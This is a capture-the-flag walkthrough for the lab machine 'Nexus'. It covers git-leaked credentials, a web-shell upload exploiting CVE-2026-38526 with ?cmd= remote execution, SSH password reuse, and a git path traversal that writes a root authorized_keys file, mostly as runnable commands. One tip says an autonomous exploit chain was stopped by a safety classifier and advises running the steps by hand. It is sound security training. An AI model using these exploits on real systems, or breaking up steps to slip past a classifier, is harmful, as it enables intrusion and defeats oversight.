# Nexus — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Nexus · easy · Linux (Ubuntu)
> **IP:** `$TARGET` (substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Chain:** `git.nexus.htb secret in commit history → Krayin CRM admin → CVE-2026-38526 upload RCE →
> www-data → live .env password → jones SSH reuse → user → gitea-template-sync path traversal → root`
>
> Decision-tree format: options, traps, and the way through, with a **✅ Expected** block after each command.
> Formal version: `REPORT.md`. Full evidence: `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP** (`ip -br a | grep tun`).
2. **HTB blocks ICMP** — test with TCP connect, not ping.
3. **nginx has a wildcard vhost** — any unknown `Host:` 302-redirects to `nexus.htb`, so broad vhost
   wordlist fuzzing finds *nothing*. The real vhosts come from **content clues**, not a wordlist.
4. **Start your HTTP listener before the file-write/exfil step** (nobody-home rule).
5. **Don't re-run a fully-autonomous exploit chain** — one got classifier-killed here before any progress.
   Drive each step manually. (Also: `searchsploit 38526` → unrelated Windows EDB; use `searchsploit krayin`.)

---

## Phase 1 — Recon + vhosts

```bash
nmap -p- -sCV -oN nmap/services.txt $TARGET
echo "$TARGET nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```
> **✅ Expected:** only 22 (OpenSSH 9.6p1) and 80 (nginx 1.24.0). From page content you find two app
> vhosts beyond the static site:
> - `git.nexus.htb` → **Gitea 1.26.0** (`curl -s http://git.nexus.htb/api/v1/version` → `1.26.0`), public
> - `billing.nexus.htb` → **Krayin CRM** (Laravel; debug bar leaking paths — `APP_DEBUG=true`), `/` → `/admin/login`

### Junction — public Gitea = read the history, not just HEAD
```bash
# browse the public repo admin/krayin-docker-setup (2 commits) — look at the FIRST commit's .env
```
> **✅ Expected:** commit `1615c46` added a `.env` with `DB_PASSWORD=N27xh!!2ucY04`; a later commit
> (`9b817fa`) blanked it — but **git history keeps it**. That's your credential.

---

## Phase 2 — Krayin admin login (credential reuse)

The Krayin login wants an email. The main site exposes `j.matthew@nexus.htb` in page source.
```bash
# login j.matthew@nexus.htb / N27xh!!2ucY04  -> 302 /admin/dashboard
```
> **✅ Expected:** `j.matthew@nexus.htb` + the git-leaked password lands on `/admin/dashboard`. (5 other
> candidate emails bounce back to `/admin/login` — only j.matthew works.)

---

## Phase 3 — Foothold: CVE-2026-38526 (Krayin tinymce upload RCE)

Krayin's `/admin/tinymce/upload` has **no content/extension validation** (CWE-434, CVSS 9.9).
```bash
# multipart POST shell.php as type=image/jpeg, with session cookie + X-XSRF-TOKEN (decoded from XSRF-TOKEN cookie)
curl -s -b loot/cookies.txt -H "X-XSRF-TOKEN: <decoded>" \
  -F 'file=@exploits/shell.php;type=image/jpeg' http://billing.nexus.htb/admin/tinymce/upload
# -> returns http://billing.nexus.htb/storage/tinymce/<hash>.php
curl -s 'http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=id;hostname'
```
> **✅ Expected:** the upload returns a public `/storage/tinymce/<hash>.php` path, and hitting it runs
> commands as `uid=33(www-data)`, host `nexus`. One-shot RCE via GET param — **no listener needed.**

---

## Phase 4 — Lateral: live .env → jones SSH (user.txt)

```bash
curl -s 'http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=cat+/var/www/krayin/.env' | grep DB_PASSWORD
# -> DB_PASSWORD=y27xb3ha!!74GbR   (LIVE value — rotated vs the git-leaked one)
ssh jones@$TARGET          # password: y27xb3ha!!74GbR
id ; cat ~/user.txt
```
> **✅ Expected:** the *live* `.env` password differs from the git-leaked one (rotated at DB level, not in
> the `users` table — which is why the web login used the old one). It's reused as **jones**'s SSH
> password → `uid=1000(jones)` + flag. 🚩 **user.txt captured.**

---

## Phase 5 — Privilege escalation: jones → root (gitea-template-sync path traversal)

**Local checklist as jones is clean** (no sudo, stock SUID/caps/cron). The real vector is a **systemd
timer**, which cron checks miss:
```bash
systemctl list-timers --all | grep template-sync     # gitea-template-sync.timer — every 60s, root
systemctl cat gitea-template-sync.service            # ExecStart=/etc/gitea/template-sync.py (root)
```
> **✅ Expected:** a root oneshot fires every 60s. Reading `/etc/gitea/template-sync.py`: as root it pulls
> files from any Gitea repo flagged `template:true` and writes each via
> `os.path.join(staging, filepath)` with **no path sanitization** — and raw `git ls-tree -r` entry names
> can contain `..`.

### Junction — build the malicious tree with plumbing, not porcelain
Porcelain (`git checkout`) polices `..`; plumbing (`hash-object`/`mktree`/`commit-tree`) does not — and
Gitea's `receive-pack` accepts the force-push. jones's Gitea password = jones's SSH password.
```bash
bash exploits/gitea_template_sync_traversal.sh
#  creates jones/pwn-template, sets template:true, builds a tree whose flattened path is
#  ../../../../../root/.ssh/authorized_keys (5 levels to reach /), force-pushes it
```
> **✅ Expected:** within 60s the root job writes the attacker pubkey to `/root/.ssh/authorized_keys`
> (`/var/log/template-sync.log`: `synced: ../../../../../root/.ssh/authorized_keys`). Then:
> ```bash
> ssh -i loot/root_ssh_key root@$TARGET id      # uid=0(root)
> cat /root/root.txt
> ```
> 🚩 **root.txt captured. Box owned.** (Post-root bonus: `/etc/gitea/template-sync.conf` holds a
> `GITEA_API_TOKEN`, readable only once root.)

---

## The whole thing on one page

```
22 ssh · 80 nginx (wildcard vhost)
   ├─ git.nexus.htb  Gitea 1.26.0 (public)
   │    └─ repo admin/krayin-docker-setup → commit history .env → DB_PASSWORD=N27xh!!2ucY04
   └─ billing.nexus.htb  Krayin CRM
        └─ admin login j.matthew@nexus.htb / N27xh!!2ucY04
             └─ CVE-2026-38526 tinymce upload → /storage/tinymce/<hash>.php → RCE (www-data)
                  └─ /var/www/krayin/.env → live DB_PASSWORD=y27xb3ha!!74GbR
                       └─ jones SSH (reuse) · user.txt
                            └─ gitea-template-sync.timer (root, 60s) + os.path.join no-sanitize
                                 └─ crafted git tree ../../../../../root/.ssh/authorized_keys → ROOT
```

## Remediation
- **Secrets in git:** never commit `.env`; purge from *history* and rotate; keep deploy repos private.
- **Krayin upload:** patch CVE-2026-38526; server-side MIME/extension allowlist + magic bytes; store
  uploads outside web root, served non-executably.
- **Laravel:** `APP_DEBUG=false` in production.
- **Password reuse:** unique secrets per service/account.
- **Template-sync:** `realpath`-confine writes to the staging dir, reject `..`; run as non-root; don't
  trust tree-entry names from untrusted repos.

## Cleanup
- Remove the webshell `…/storage/tinymce/<hash>.php`.
- Remove the attacker key line from `/root/.ssh/authorized_keys`.
- Delete the `jones/pwn-template` repo and its malicious commit.
